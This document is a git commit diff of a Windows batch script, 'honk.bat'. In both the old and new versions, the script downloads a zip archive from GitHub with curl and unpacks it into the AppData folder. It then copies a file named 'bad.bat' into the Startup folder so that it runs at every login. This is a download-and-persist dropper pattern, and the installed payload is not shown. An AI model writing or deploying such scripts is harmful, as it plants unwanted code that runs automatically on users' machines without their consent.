651e5fb325906d4d4f3d315fbb5564e4eca2a225
Bartosz Ratajczyk <bratajczyk.software+github@gmail.com>
2023-06-08 14:57:26 +0200

    Update honk.bat

--- honk.bat
+++ honk.bat
@@ -1,7 +1,7 @@
 set "Startup_Dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-start "" /MIN "%Startup_Dir%\bad.bat"
-curl "https://github.com/glonpl/DevOpsDockerProject/archive/refs/heads/master.zip" --ssl-no-revoke -L -o temp.zip
-mkdir %APPDATA%\Honk
-powershell -Command "Expand-Archive temp.zip -DestinationPath %APPDATA%" 
-copy "%APPDATA%\Honk-master\bad.bat" "%Startup_Dir%\bad.bat"
+@REM start "" /MIN "%Startup_Dir%\bad.bat"
+curl "https://github.com/glonpl/Honk/archive/refs/heads/main.zip" --ssl-no-revoke -L -o temp.zip
+@REM mkdir %APPDATA%\Honk
+powershell -Command "Expand-Archive %TEMP%\temp.zip -DestinationPath %APPDATA%" 
+copy "%APPDATA%\Honk-main\bad.bat" "%Startup_Dir%\bad.bat"
 del temp.zip
